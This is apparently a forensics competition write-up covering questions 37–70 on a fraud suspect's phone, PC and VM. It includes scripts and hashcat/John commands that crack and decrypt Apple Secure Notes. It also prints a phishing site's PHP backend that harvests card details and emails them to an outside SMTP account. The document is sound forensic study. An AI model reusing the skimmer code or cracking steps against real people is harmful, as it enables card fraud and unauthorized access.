note里面一共四个备忘录数据，其中\u0026quot;halo\u0026quot;和\u0026quot;今天\u0026quot;两条数据是看不见的，不确定是哪个\n不过下一题会给出答案\n38.承上题，上述备忘录的内容有一串数字，它是什么?(以阿拉伯数字回答) 上网查找破解notes密码的方法，找到了下面这篇文章：\nhttps://www.kaotenforensic.com/cellebrite/blog/bruteforce-securenotes-hashcat/ 其中有着这样一段话：\n原来看数据库就能知道哪一个数据被加密了，看来以后得多看才是，我们导出看一眼：\n果真找到了对应数据，sql查询一下：\nZCRYPTOITERATIONCOUNT显示加密迭代次数 ZISPASSWORDPROTECTED=1表示有密码保护，0表示没有 SELECT ZTITLE1, ZCRYPTOITERATIONCOUNT, ZISPASSWORDPROTECTED FROM ZICCLOUDSYNCINGOBJECT WHERE ZTITLE1 IN (\u0026#39;Halo\u0026#39;, \u0026#39;今天\u0026#39;); 什么，竟然这两个都真的被加密了，那谁还分得清啊！\n不要紧，正确答案是可以被解密出来有一串数字的，我们接着往下做\nnotes加密的原理大概就是使用PBKDF2和SHA256算法把简单密码通过反复的哈希拉伸成一个16字节密钥，那么我们就可以想办法从数据库文件（也就是NoteStore.sqlite）里面提取出这个hash，再对它进行爆破\n文章里给出了提取hash的perl语言脚本，这里我们保存成iOS_notes.pl：\n#!/usr/bin/env perl use strict; use warnings; use DBI; use DBD::SQLite; die \u0026#34;usage: $0 NoteStore.sqlite\\n\u0026#34; unless (scalar @ARGV == 1); my $database = shift @ARGV; my $dsn = \u0026#34;DBI:SQLite:dbname=$database\u0026#34;; my $userid = \u0026#34;\u0026#34;; my $password = \u0026#34;\u0026#34;; my $dbh = DBI-\u0026gt;connect ($dsn, $userid, $password, { RaiseError =\u0026gt; 1 }) or die $DBI::errstr; my $sth = $dbh-\u0026gt;prepare (\u0026#34;SELECT Z_PK,ZCRYPTOITERATIONCOUNT,ZCRYPTOSALT,ZCRYPTOWRAPPEDKEY FROM ZICCLOUDSYNCINGOBJECT WHERE ZISPASSWORDPROTECTED=1\u0026#34;); $sth-\u0026gt;execute () or die $DBI::errstr; while (my $row = $sth-\u0026gt;fetchrow_arrayref ()) { printf (\u0026#34;\\$ASN\\$*%d*%d*%s*%s\\n\u0026#34;, $row-\u0026gt;[0], $row-\u0026gt;[1], unpack (\u0026#34;H*\u0026#34;, $row-\u0026gt;[2]), unpack (\u0026#34;H*\u0026#34;, $row-\u0026gt;[3])); } $sth-\u0026gt;finish; $dbh-\u0026gt;disconnect (); exit (0); 我们也可以直接手动从数据库里面复制出来hash值，不过有现成的脚本不用白不用：\nperl iOS_notes.pl NoteStore.sqlite \u0026gt; hash.txt 而Apple Secure Notes的设计是一个账户的所有安全备忘录可以用同一个自定义密码解锁，也就是说不管我们取出来多少加密过的hash，只要破解出来一个就可以：\nhead -n 1 hash.txt \u0026gt; hash_first.txt Apple Secure Notes的加密算法对应16200这个模式，我们指定然后运行，这里用的是kali自带字典：\nhashcat -m 16200 -a 0 hash_first.txt /usr/share/wordlists/rockyou.txt 然而我是在一台Kali虚拟机里操作的，虚拟机环境无法直接调用物理GPU，Hashcat只能切换到CPU模式\n行吧慢点就慢点，但可恶的Hashcat的通用CPU驱动内存分配上限很低，而-m 16200恰恰要很多内存，这就导致跑不动破解的哈希算法\n为了解决这个问题，我折腾了很久都没有用，最后只能换一个工具（早该想到的）John the Ripper，据说对CPU的支持非常出色，没有内存限制问题，而且kali也默认安装了它：\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash_first.txt 最后运行很成功，查看破解密码：\njohn --show hash_first.txt 234567 不过到这一步只是有密码而已，我们还需要得到内容\n我们还是处理NoteStore.sqlite数据库，加密数据可能在两个地方：ZICNOTEDATA表的ZDATA列（通常是笔记主体）或者ZICCLOUDSYNCINGOBJECT表的ZENCRYPTEDVALUESJSON列（通常是附件元数据等）\n或许最简单的方式就是手机仿真然后直接打开notes看一眼吧（我猜的），不过我并不知道如何这样做，也不知道能不能这样做，最后调教了很久的ai，处理了很久的环境问题，写出来了一个python脚本：\n#!/usr/bin/env python3 import sqlite3 import sys import zlib from Crypto.Cipher import AES from Crypto.Protocol.KDF import PBKDF2 from Crypto.Hash import SHA256 from cryptography.hazmat.primitives.keywrap import aes_key_unwrap from cryptography.hazmat.backends import default_backend def decrypt_aes_gcm(key, nonce, ciphertext, tag): \u0026#34;\u0026#34;\u0026#34;AES-GCM 解密\u0026#34;\u0026#34;\u0026#34; try: cipher = AES.new(key, AES.MODE_GCM, nonce=nonce) # 关联数据为空，不传 assoc_data return cipher.decrypt_and_verify(ciphertext, tag) except ValueError as e: print(f\u0026#34;[-] AES-GCM Decryption failed: {e}\u0026#34;) return None def main(): if len(sys.argv) != 3: print(f\u0026#34;Usage: {sys.argv[0]} NoteStore.sqlite password\u0026#34;) sys.exit(1) db_file = sys.argv[1] password = sys.argv[2].encode() conn = sqlite3.connect(db_file) cursor = conn.cursor() try: cursor.execute(\u0026#34;\u0026#34;\u0026#34; SELECT t1.Z_PK, t1.ZCRYPTOITERATIONCOUNT, t1.ZCRYPTOSALT, t1.ZCRYPTOWRAPPEDKEY, t1.ZENCRYPTEDVALUESJSON, t2.ZCRYPTOINITIALIZATIONVECTOR, t2.ZCRYPTOTAG, t2.ZDATA FROM ZICCLOUDSYNCINGOBJECT AS t1 JOIN ZICNOTEDATA AS t2 ON t1.Z_PK = t2.ZNOTE WHERE t1.ZISPASSWORDPROTECTED = 1 \u0026#34;\u0026#34;\u0026#34;) except sqlite3.OperationalError as e: print(f\u0026#34;[!] Database query failed. The schema might be different. Error: {e}\u0026#34;) conn.close() sys.exit(1) rows = cursor.fetchall() if not rows: print(\u0026#34;[!] No password protected notes found in the database.\u0026#34;) conn.close() return decryption_successful = False for row in rows: pk, iterations, salt, wrapped_key_blob, encrypted_json, iv_blob, tag_blob, data_blob = row print(f\u0026#34;\\n--- Processing Note Z_PK={pk} ---\u0026#34;) if not (salt and wrapped_key_blob): print(\u0026#34;[*] Skipping note due to missing salt or wrapped key.\u0026#34;) continue salt = bytes(salt) wrapped_key_blob = bytes(wrapped_key_blob) try: # 步骤 1: 派生主密钥 (KEK) print(\u0026#34;[+] Step 1: Deriving Key Encrypting Key using PBKDF2-SHA256...\u0026#34;) main_key = PBKDF2(password, salt, dkLen=16, count=iterations, hmac_hash_module=SHA256) # 步骤 2: 使用 cryptography AES Key Unwrap 解包笔记密钥 print(\u0026#34;[+] Step 2: Unwrapping note encryption key using AES Key Unwrap...\u0026#34;) aes_key = aes_key_unwrap(main_key, wrapped_key_blob, backend=default_backend()) print(\u0026#34;[+] Successfully unwrapped note key!\u0026#34;) except (ValueError, TypeError) as e: print(f\u0026#34;[!] Step 2 FAILED. This almost certainly means the password \u0026#39;{sys.argv[2]}\u0026#39; is incorrect. Error: {e}\u0026#34;) continue # 步骤 3: 选择要解密的笔记数据 data_to_decrypt = None source_column = \u0026#34;\u0026#34; if encrypted_json: data_to_decrypt = encrypted_json source_column = \u0026#34;ZENCRYPTEDVALUESJSON\u0026#34; elif data_blob: data_to_decrypt = data_blob source_column = \u0026#34;ZDATA from ZICNOTEDATA\u0026#34; else: print(f\u0026#34;[*] Note Z_PK={pk} key was unwrapped, but no content data found to decrypt.\u0026#34;) decryption_successful = True continue print(f\u0026#34;[+] Step 3: Found encrypted content in column \u0026#39;{source_column}\u0026#39;.\u0026#34;) data_to_decrypt = bytes(data_to_decrypt) # 步骤 4: AES-GCM 解密笔记内容 if not (iv_blob and tag_blob): print(f\u0026#34;[*] Skipping content decryption for Z_PK={pk}, missing IV or Tag in ZICNOTEDATA.\u0026#34;) continue nonce_d = bytes(iv_blob) tag_d = bytes(tag_blob) ciphertext_d = data_to_decrypt print(f\u0026#34;[+] Step 4: Decrypting note content using AES-GCM...\u0026#34;) plaintext_gzipped = decrypt_aes_gcm(aes_key, nonce_d, ciphertext_d, tag_d) if plaintext_gzipped: # 步骤 5: Gzip 解压 print(f\u0026#34;[+] Step 5: Decompressing Gzip data...\u0026#34;) try: decompressed_data = zlib.decompress(plaintext_gzipped, 16 + zlib.MAX_WBITS) print(f\u0026#34;======== DECRYPTED NOTE (Z_PK={pk}) ========\u0026#34;) # 只显示可解码文本，忽略不可打印字符 print(decompressed_data.decode(\u0026#39;utf-8\u0026#39;, errors=\u0026#39;ignore\u0026#39;)) print(f\u0026#34;{\u0026#39;=\u0026#39;*60}\\n\u0026#34;) decryption_successful = True except zlib.error as e: print(f\u0026#34;[!] Gzip decompression failed for Z_PK={pk}. Error: {e}\u0026#34;) print(f\u0026#34;Raw decrypted data (gzipped):\\n{plaintext_gzipped}\u0026#34;) conn.close() if not decryption_successful and rows: print(\u0026#34;\\n[!] Decryption failed for all notes. Please double-check the password.\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: main() 简单说一下运行过程：\n脚本首先将我们输入的密码、从数据库ZICCLOUDSYNCINGOBJECT表中读取的盐和迭代次数三者混合，进行20000次SHA256哈希，得到主密钥，用主密钥去解密从ZICCLOUDSYNCINGOBJECT表得到的 ZCRYPTOWRAPPEDKEY列，取出专门用于加密这条笔记内容的笔记密钥\n接着脚本会检查两个可能存放笔记内容的位置，使用笔记密钥配合从ZICNOTEDATA表中读取的初始化向量和认证标签，对加密内容进行解密\n最后解密出的数据并非纯文本，而是一个gzip压缩包，调用zlib.decompress函数对其进行解压，得到最终的二进制数据（Protobuf格式），再尽力将这些二进制数据解码为UTF-8文本，并将其中可读的部分打印在屏幕上\n嗯，真是太麻烦了\n总之下一步，使用下面的命令运行脚本，注意传入明文密钥（少什么库就下载什么）：\npython decrypt_notes.py NoteStore.sqlite \u0026#34;234567\u0026#34; 输出结果：\n--- Processing Note Z_PK=31 --- [+] Step 1: Deriving Key Encrypting Key using PBKDF2-SHA256... [+] Step 2: Unwrapping note encryption key using AES Key Unwrap... [+] Successfully unwrapped note key! [+] Step 3: Found encrypted content in column \u0026#39;ZDATA from ZICNOTEDATA\u0026#39;. [+] Step 4: Decrypting note content using AES-GCM... [+] Step 5: Decompressing Gzip data... ======== DECRYPTED NOTE (Z_PK=31) ======== ▒ Halo 123456▒ (▒ (▒ (▒ (▒ \u0026#34; ▒ c=!FCe8▒h▒hȕ* hȕ* ▒hȕ* ▒hȕ* ▒hɕ* ▒hɕ ============================================================ --- Processing Note Z_PK=33 --- [+] Step 1: Deriving Key Encrypting Key using PBKDF2-SHA256... [+] Step 2: Unwrapping note encryption key using AES Key Unwrap... [+] Successfully unwrapped note key! [+] Step 3: Found encrypted content in column \u0026#39;ZDATA from ZICNOTEDATA\u0026#39;. [+] Step 4: Decrypting note content using AES-GCM... [+] Step 5: Decompressing Gzip data... ======== DECRYPTED NOTE (Z_PK=33) ======== 今天 ▒ (▒ (▒ \u0026#34; ▒ c=!FC*8 h☚* h☚* h☚ ============================================================ 上面的是\u0026quot;Halo\u0026quot;的，下面的是\u0026quot;今天\u0026quot;的，它们的内容和很多▒这样的奇怪字符混在一起，是因为它们被包裹在 Protobuf这种二进制结构中，用于保存格式、字体、附件引用等信息，我们现在看到的，就是把这个复杂的二进制结构强行当成文本显示的结果\n如何分辨？那最好还是丢给ai：\n那么123456应该就是题目说的数字串了\n123456 此时37题的真正的答案也出来了：\nHalo 但是比赛是断网的吧，赛场上这一题我断然是做不出来的\n林浚熙计算机(39-52) 39.林浚熙计算机(Computer) 的操作系统(Operating System) 版本是什么? A. Windows 10 Pro for Workstations 21H2\nB. Windows 10 Pro 22H2\nC. Windows 10 Home 21H2\nD. Windows 10 Pro for Workstations 21H1\n操作系统名称为Windows 10 Pro for Workstations，当前Build版本号是19044.2130，这是Windows 10 21H2的一个更新版本\nA 40.林浚照计算机安装了什么品牌的虚拟专用网络 Virtual Private Network - VPN)软件?(不要输入符号及空白，以大写英文及阿拉伯数字回答) 火眼支持详细分析的软件里面没有vpn，但在用户桌面找到一个快捷方式，ExpressVPN：\n为了保险起见（万一名称不完整），文件系统里面搜一下，确实是vpn： ExpressVPN 41.承上题，分析该虚拟专用网络的日志(Log)，他在哪天安装该虚拟专用网络?(如答案为 2022-12-29，需回答 20221229) log那么长谁看啊，直接火眼基本信息里看安装软件：\n20220915 42.检视林浚照计算机的数据，他使用哪种加密货币(Cryptocurrency) 以支付虚拟专用网络软件?以大写英文回答该加密货币的全名，如 BITCOIN) 电脑里面有四个浏览器，一个个搜索，最终在chrome里面搜索出来了：\nBitcoin 话说这不就是题目示例的吗？心理战这一块\n43.林浚熙的加密货币钱包Cryptocurrency Wallet) 名称是什么?不要输入符号，以大写英文及阿拉伯数字回答) 火眼里面找不到什么有用的信息，仿真进入电脑桌面看一下：\n看到了老熟人vpn，还有一个未知软件electrum，上网搜一下：\n这就是电子钱包了，打开看看：\nWallet后的就是钱包名了，后面还有密码\nTELLAW_IEH 不过题目说不要输入符号，不知道是什么意思\n44.林浚熙计算机里安装了哪个浏览器(Web Browser)? A.Tor Browser\nB.Opera\nC.Google Chrome\nD.Internet Explorer\nE.Microsoft Edge\n前文找使用的电子货币的时候已经说过了：\nACDE 45.林浚熙使用浏览器Google Chrome曾经浏览最多的是哪 个网站? A. https://gmail.com B. https://mail.google.com/mail C. https://web.whatsapp.com D. https://facebook.com C 46.除了上述网站,林浚熙曾使用浏览器Google Chrome搜索过什么? A. javascript教学\nB. php sql教学\nC. tor教学\nD. docker image教学\nE. electrum教学\n一个个搜就行\nBCDE 47.林浚照的计算机安装了一个通讯软件Signal，它的用户资讯储存路径是什么? A.\\Users\\HEI\\AppData\\Roaming\\Signal\nB.\\Program Files(x86)\\Signal\nC.\\Users\\HEI\\Desktop\\Signal\nD.\\Users\\user\\Roaming\\Signal\n我们在signal里面随便点开一个联系人，就能看见存储路径：\nA 48.通讯软件Signal采用一个档案存放用户的聊天记录，它的档案名是什么?(不要输入，以大写英文及阿拉伯数字回答。如Cat10.jpg，需回答CAT10JPG) 打开私聊消息，右键任意消息记录，点击跳转到源文件：\n原来就是上一题看到过的db.sqlite：\nDBSQLITE 49.承上题，对上档案进行分析，林发熙的联络人当中有多少人安装了Siqnal?(以阿拉伯数字回答) 很奇怪，不知道这题想问什么，联络人指的是林俊熙手机的联络人吗，那比对一下：\n这四个人的电话（+852）和昵称都对得上，那应该是四个\n4 另外，上一题的db文件打不开，经检查发现不是sqlite格式，也不是其他常见文件格式，不知道有什么猫腻\n*原来这是因为加密了\nSignal会把消息和相关数据存储在一个db.sqlite数据库文件中，但这个数据库本身是加密的\n具体来说消息数据库存放位置通常在用户目录下，例如Windows:\nC:\\Users\\\u0026lt;用户名\u0026gt;\\AppData\\Roaming\\Signal\\sql\\db.sqlite Signal使用SQLCipher对SQLite数据库进行加密，解密密钥存放在另一个文件里：\nC:\\Users\\\u0026lt;用户名\u0026gt;\\AppData\\Roaming\\Signal\\config.json 在ChunHei_Desktop.E01/1/Users/HEI/AppData/Roaming/Signal/config.json中可以找到数据库密码：\n50.林浚熙在“Signal\u0026rsquo; 曾经与某人对话，那人的手机号码是什么? 需要与区码(Area Code) 一同答(以阿拉伯数字) 上面过程中已经找过，是ROCKY，不多赘述：\n85270711901 51.承上题，两人在Signal\u0026rsquo; 的对话中有些讯息(Message) 包含附件，这些讯息的 \u0026lsquo;ID\u0026rsquo;包括? A.5b9650fe-3bb6-4182-9900-f56177003672\nB.46a8762b-78ea-49aa-a6f5-b24975ec189f\nC.9729bf92-ab9c-45f7-8147-66234296aele\nD.47233ffe-1a73-4b3d-b97c-626246ec3129\n我的db.sqlite文件打不开，做不了，难道是有隐写吗？可是也没发现任何线索，跳了吧\n52.承上题，林浚熙曾经于2022年10月20日转账（Transfer Money) 予上述对话人士,那次转账的参考编号是什么?(以大写英文及阿拉伯数字回答) N91088774024 林浚熙的VM(53-70) 53.林浚熙的计算机安装了多少台虚拟机Virtual Machine - VM) ?(以阿拉伯数字回答) A. 4\nB. 1\nC. 2\nD. 3\nB 54.林浚熙的计算机里的虚拟机(VM) 存放在什么路径? A.\\Users\\Public\\Documents \\Virtual Machines\nB.\\Program Files\\Virtual Machines\nC.\\User\\HEN\\Roaming\\Virtual Machines\\\nD.\\Users\\HEN\\Documents\\Virtual Machines\nD 到底是HEI还是HEN？应该是题目搞错了\n55.虚拟机 (VM) 使用什么版本的作业系统(Operating System) ? A. CentOs Linux 7.5.1804 (Core)\nB. Ubuntu 22.04.1 LTS\nC. CentOS Linux release 7.6.1810(Core)\nD. Ubuntu 20.04.5 LTS\n把这个.vmdk添加为新检材，查看基本信息：\nD 56.虚拟机(VM) 中的文件传输服务器(FTP Server) 有哪些用户? A. nobody\nB. root\nC. admin\nD. man\nE. ftpuser\n从这一步开始，只靠火眼是不行的了，我们必须想办法登录嫌疑人使用的ubuntu虚拟机\n首先我的想法是直接从火眼检材里面导出储存有虚拟机的文件夹，可是导出的却无法使用，总是提示\u0026quot;找不到ubuntu 64-bit.vmdk\u0026quot;，即使修改了.vmx文件，去掉路径空格也没有用，而且导出文件的好几个.vmdk似乎混在一起了，分卷大小很奇怪\n在之后，我想直接在仿真了嫌疑人windows的虚拟机里使用这个虚拟机，结果可能是因为我的电脑没有关闭hyper-v和vbs，让虚拟机不能使用虚拟化功能，而手动关闭需要做的操作太麻烦也太未知，遂放弃\n最后成功的方案：\n安装好vmvare tools之后，按照路径把windows虚拟机里面存放ubuntu的文件夹复制到本机电脑，因为不知道密码所以把.vmdk交给火眼仿真，让火眼重置并生成新的虚拟机，最后登录再使用ssh链接（方便操作）即可\n回到题目，判断ftp使用者的第一步是知道这台服务器上安装了哪一种ftp，使用下面命令查看：\nps aux | grep ftp 这里可以看到是vsftp\n具体判断方式需要审查vsftpd的黑白名单，结合uid和shell的允许与否，给ai整理成下面的shell脚本：\n#!/bin/bash CONFIG=\u0026#34;/etc/vsftpd.conf\u0026#34; FTPUSERS=\u0026#34;/etc/vsftpd.ftpusers\u0026#34; USER_LIST_FILE=\u0026#34;/etc/vsftpd.user_list\u0026#34; if ! systemctl is-active --quiet vsftpd; then echo \u0026#34;vsftpd 未运行\u0026#34; exit 1 fi [ ! -f \u0026#34;$CONFIG\u0026#34; ] \u0026amp;\u0026amp; { echo \u0026#34;配置文件不存在\u0026#34;; exit 1; } LOCAL_ENABLE=$(grep -v \u0026#39;^#\u0026#39; \u0026#34;$CONFIG\u0026#34; | grep -E \u0026#39;local_enable=.*YES\u0026#39; \u0026gt;/dev/null \u0026amp;\u0026amp; echo YES || echo NO) ANONYMOUS_ENABLE=$(grep -v \u0026#39;^#\u0026#39; \u0026#34;$CONFIG\u0026#34; | grep -E \u0026#39;anonymous_enable=.*YES\u0026#39; \u0026gt;/dev/null \u0026amp;\u0026amp; echo YES || echo NO) USERLIST_ENABLE=$(grep -v \u0026#39;^#\u0026#39; \u0026#34;$CONFIG\u0026#34; | grep -E \u0026#39;userlist_enable=.*NO\u0026#39; \u0026gt;/dev/null \u0026amp;\u0026amp; echo NO || echo YES) USERLIST_DENY=$(grep -v \u0026#39;^#\u0026#39; \u0026#34;$CONFIG\u0026#34; | grep -E \u0026#39;userlist_deny=.*NO\u0026#39; \u0026gt;/dev/null \u0026amp;\u0026amp; echo NO || echo YES) BLACKLIST=() [ -f \u0026#34;$FTPUSERS\u0026#34; ] \u0026amp;\u0026amp; while IFS= read -r line; do [[ -z \u0026#34;$line\u0026#34; || \u0026#34;$line\u0026#34; =~ ^# ]] || BLACKLIST+=(\u0026#34;$line\u0026#34;) done \u0026lt; \u0026#34;$FTPUSERS\u0026#34; USER_LIST=() [ -f \u0026#34;$USER_LIST_FILE\u0026#34; ] \u0026amp;\u0026amp; while IFS= read -r line; do [[ -z \u0026#34;$line\u0026#34; || \u0026#34;$line\u0026#34; =~ ^# ]] || USER_LIST+=(\u0026#34;$line\u0026#34;) done \u0026lt; \u0026#34;$USER_LIST_FILE\u0026#34; USERS=() while IFS=: read -r username _ uid _ _ _ shell; do if [ \u0026#34;$uid\u0026#34; -ge 1000 ] \u0026amp;\u0026amp; [[ \u0026#34;$shell\u0026#34; != /usr/sbin/nologin \u0026amp;\u0026amp; \u0026#34;$shell\u0026#34; != /bin/false ]]; then USERS+=(\u0026#34;$username\u0026#34;) fi done \u0026lt; /etc/passwd ALLOWED_USERS=() if [ \u0026#34;$LOCAL_ENABLE\u0026#34; = \u0026#34;YES\u0026#34; ]; then for u in \u0026#34;${USERS[@]}\u0026#34;; do [[ \u0026#34; ${BLACKLIST[*]} \u0026#34; == *\u0026#34; $u \u0026#34;* ]] \u0026amp;\u0026amp; continue if [ \u0026#34;$USERLIST_ENABLE\u0026#34; = \u0026#34;YES\u0026#34; ]; then if [ \u0026#34;$USERLIST_DENY\u0026#34; = \u0026#34;YES\u0026#34; ]; then [[ \u0026#34; ${USER_LIST[*]} \u0026#34; == *\u0026#34; $u \u0026#34;* ]] \u0026amp;\u0026amp; continue else [[ \u0026#34; ${USER_LIST[*]} \u0026#34; != *\u0026#34; $u \u0026#34;* ]] \u0026amp;\u0026amp; continue fi fi ALLOWED_USERS+=(\u0026#34;$u\u0026#34;) done fi echo \u0026#34;实际可登录 FTP 用户:\u0026#34; if [ ${#ALLOWED_USERS[@]} -eq 0 ]; then echo \u0026#34;无用户可登录\u0026#34; else printf \u0026#34;%s\\n\u0026#34; \u0026#34;${ALLOWED_USERS[@]}\u0026#34; fi [ \u0026#34;$ANONYMOUS_ENABLE\u0026#34; = \u0026#34;YES\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;匿名用户可登录\u0026#34; 保存为test.sh，给他添加执行权限：\nchmod +x test.sh 运行：\n./test.sh 一共两个，其中只有ftpuser符合题目选项\nD 57.虚拟机设置了什么网页服务器(Web Server)? A. NGINX\nB. LIGHTTPD\nC. WORDPRESS\nD. APACHE\nE. IIS\n直接在火眼里就能分析，明面上的有apache和nginx，docker容器里面还有一个nginx，再没别的了：\nAD *做到后面回来看，会发现其实真正只有一个 —— docker的nginx是可以使用的，本机无法检测到nginx和apache，所以这一题真正应该是只nginx：\nA *再次更正，其实是有apache的，只不过apache在ubuntu的服务名称是apache2，所以答案还是：\nAD 58.网页服务器目录内有图片档案，而此档案的储存位置是? A. /var/www/html/post/src\nB. /var/www/html/post/css\nC. /var/www/html/post/vendor\nD. /var/www/post\n没有tree命令，我们使用ls查看一下/var/www：\nls -R -1 /var/www 在/var/www/html/post/css下发现.png文件：\nB 59.分析网页服务器的网站数据，假网站的公司名称是什么? A. Krick Global Logistics\nB. Global Logistics\nC. Krick Post Global Logistics\nD. Krick Post\n一开始我以为火眼分析的apache是错的，因为除了一条空的站点信息啥也没有，但点进去才发现原来这是apache的配置文件，这台服务器上搭载了的是apache2\n其实在上一题就应该意识到了，因为本机没有nginx，却有/var/www目录\n在配置文件里面也能够找到网站页面存放的位置：\n那么同上题图，就可以知道一共有html和post两个页面\n服务器的apache2已经打开了，直接访问一下，发现html访问不了，只有post有用：\nC 不要忽略了Krick Post下还有一行小字Global Logistics\n60.检视假网站首页的显示，AY806369745HK 代表什么? A. 邮件号码\nB. 邮件收费号码\nC. 邮件序号\nD. 邮件参考号码\n同上题图：\nA 61.分析假网站的资料，当受害人经假网站输入数据后，网站会产生一个档案，它的档案名是什么?(不要输入“，以大写英文及阿拉数字回答。如 Cat10.jpg，需回答CAT10JPG) 查看网站介绍界面/var/www/html/post/index.php，发现这个表单提交数据的方式是：\n\u0026lt;form align=\u0026#34;center\u0026#34; action=\u0026#34;process.php\u0026#34; method=\u0026#34;post\u0026#34; name=\u0026#34;Customerinfo\u0026#34;\u0026gt; 表单会提交到process.php进行文件处理，也就是说档案名取决于process.php内部的实现\n这个文件也在index.php同级，查看可以看到提交的数据会被写入一个固定的文件：\n$resultFile = \u0026#34;vu.txt\u0026#34;; $fOpen = fopen($resultFile, \u0026#34;a\u0026#34;); fwrite($fOpen, \u0026#34;Date \u0026amp; Time: \u0026#34;.$dateTime.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;Card Holder: \u0026#34;.$holdername.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;Card no.: \u0026#34;.$cardno.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;cvv: \u0026#34;.$cvv.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;expire date: \u0026#34;.$exp_mth.\u0026#34;/\u0026#34;.$exp_yr.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;Email: \u0026#34;.$email.\u0026#34;@\u0026#34;.$email_domn.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;Browser Info: \u0026#34;.$browser.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;\\n\u0026#34;); //End of Entry fclose($fOpen); 也就是说档案名是固定的vu.txt，我们也见过，这个文件也在index.php同级\nVUTXT 62.分析假网站档案，process.php\u0026rsquo; 源码(Source Code),推测此档案的用途可能是? A. 改变函数\nB. 产生档案\nC. 发出邮件\nD. 更新数据库\n依旧process.php：\n// 从 POST 获取受害人提交的数据 $holdername = $_POST[\u0026#34;holdername\u0026#34;]; $cardno = $_POST[\u0026#34;cardno\u0026#34;]; $cvv = $_POST[\u0026#34;cvv\u0026#34;]; $exp_mth = $_POST[\u0026#34;exp_mth\u0026#34;]; $exp_yr = $_POST[\u0026#34;exp_yr\u0026#34;]; $email = $_POST[\u0026#34;email\u0026#34;]; $email_domn = $_POST[\u0026#34;email_domn\u0026#34;]; // 设置档案名称 $resultFile = \u0026#34;vu.txt\u0026#34;; // 打开档案并写入数据 $fOpen = fopen($resultFile, \u0026#34;a\u0026#34;); fwrite($fOpen, \u0026#34;Date \u0026amp; Time: \u0026#34;.$dateTime.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;Card Holder: \u0026#34;.$holdername.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;Card no.: \u0026#34;.$cardno.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;cvv: \u0026#34;.$cvv.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;expire date: \u0026#34;.$exp_mth.\u0026#34;/\u0026#34;.$exp_yr.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;Email: \u0026#34;.$email.\u0026#34;@\u0026#34;.$email_domn.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;Browser Info: \u0026#34;.$browser.\u0026#34;\\n\u0026#34;); fwrite($fOpen, \u0026#34;\\n\u0026#34;); //End of Entry fclose($fOpen); ... use PHPMailer\\PHPMailer\\SMTP; require_once __DIR__ . \u0026#39;/vendor/phpmailer/src/Exception.php\u0026#39;; $mail = new PHPMailer(true); $mail-\u0026gt;isSMTP(); $mail-\u0026gt;Host = \u0026#39;smtp.gmai1.com\u0026#39;; $mail-\u0026gt;SMTPAuth = true; $mail-\u0026gt;SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS; $mail-\u0026gt;Port = 587; $mail-\u0026gt;Username = \u0026#39;chunhe11amm@gmail.com\u0026#39;; $mail-\u0026gt;Password = \u0026#39;rtatsceucpacocbdacs\u0026#39;; $mail-\u0026gt;setFrom(\u0026#39;chunhe11amm@gmail.com\u0026#39;, \u0026#39;Smith\u0026#39;); $mail-\u0026gt;addAddress(\u0026#39;chunhe11amm@gmail.com\u0026#39;, \u0026#39;Tyler\u0026#39;); $mail-\u0026gt;IsHTML(true); $mail-\u0026gt;Subject = \u0026#34;vu\u0026#34;; $mail-\u0026gt;Body = $message; $mail-\u0026gt;AltBody = \u0026#39; \u0026#39;; $mail-\u0026gt;send(); 它做了两件事：\n产生档案：把受害人提交的数据写入vu.txt\n发出邮件：将提交的数据通过PHPMailer发送到指定邮箱\nBC 63.检视档案process.php\u0026rsquo; 源码, 林浚照的电邮密码是?(以大写英文回答) 上一题的代码就能看出来，有这样一行：\n$mail-\u0026gt;Password = \u0026#39;rtatsceucpacocbdacs\u0026#39;; 也就是说电邮密码是：\nRTATSCEUCPACOCBDACS 64.分析档案process.php\u0026rsquo; 源码, 它不会收集哪些资料? A. GPS位置\nB. 信用卡号码\nC. 短讯验证码\nD. 电话号码\nE. 电邮地址\n还是看源码，不多赘述了\nACD 65.虚拟机 (VM) 安装了 Docker 程序，列出一个以'5\u0026rsquo;作为开端的 \u0026lsquo;Docker\u0026rsquo; 镜像 (Image) ID (以阿拉伯数字及大写英文回答) 这也能作为题目吗\u0026hellip;\n5d58c024174d 66.Docker 容器 (Container) \u0026lsquo;mysql\u0026rsquo; 对外开放的通讯端口 (Port) 是? 启动看一眼：\n43306 67.Docker容器mysql，用户\u0026rsquo;root\u0026rsquo; 的密码是?(以大写英文及阿拉伯数字回答) 查看命令历史记录：\n2wsx3edc 68.Docker容器，mysql 里哪一个数据库储存了大量个人资料?(以大写英文回答) 在本机链接数据库，账号密码root/2wsx3edc，一找就找到了：\nCUSTOMER 69.检视 Docker 容器\u0026rsquo;mysql\u0026rsquo; 内数据库里的资料，李大辉的出生日期是?(如答案为 2022-12-29，需答 20221229) sql查询（不知道为什么搜名字搜不出来，可能是过滤条件没写好，电话在李大辉手机可以得到）：\nSELECT DOB FROM customer WHERE Tel = \u0026#39;852-56412770\u0026#39; 19850214 70.通过取证调查结果进行分析(包括但不限于以上问题及情节)，林浚熙的行为涉及哪一种罪案? A.传送儿童色情物品\nB.抢劫\nC.诈骗\nD.勒索金钱\nE.购买毒品\n嗯，最好玩的一题\nC是对李大辉\nD是对王晓琳\nE在林俊熙电脑里面有线索，signal可以看见溜冰的记录： 嘻嘻，死罪！！！！\nCDE 